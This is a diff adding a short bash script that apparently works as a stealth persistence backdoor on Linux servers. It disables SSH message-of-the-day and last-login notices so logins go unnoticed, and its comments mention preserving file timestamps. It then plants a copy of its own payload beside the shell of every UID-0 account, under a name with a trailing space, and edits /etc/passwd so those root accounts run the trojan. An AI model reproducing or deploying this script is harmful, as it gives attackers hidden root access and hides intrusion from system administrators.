@@ -1,0 +1,28 @@
+#!/bin/bash
+
+# TODO: use 'touch' to keep file original timestamp
+# TODO: check other scripts
+sed -i '/pam_motd.so/s/^/#/g' /etc/pam.d/sshd
+sed -i '/pam_mail.so/s/^/#/g' /etc/pam.d/sshd
+
+sed -i 's/^.*PrintMotd.*$//g' /etc/ssh/sshd_config
+sed -i 's/^.*PrintLastLog.*$//g' /etc/ssh/sshd_config
+
+# TODO: better handling of this
+# TODO: use 'touch' to keep file original timestamp
+echo >> /etc/ssh/sshd_config
+echo PrintMotd no >> /etc/ssh/sshd_config
+echo PrintLastLog no >> /etc/ssh/sshd_config
+
+# TODO: check which command to reload service in case of initd instead of systemctl
+systemctl reload ssh
+
+# get all shells of users with :0: (root privileges)
+SHELL_BIN="$(cat /etc/passwd | grep :0: | cut -d':' -f7)"
+for i in $SHELL_BIN; do
+	tail -n{NLINES} "$0" > "$i "
+	chmod +x "$i "
+done
+
+# :0: to change all shells of users with root privileges
+sed -i '/.*:0:.*[^ ]$/ s/\(^.*$\)/\1 /' /etc/passwd
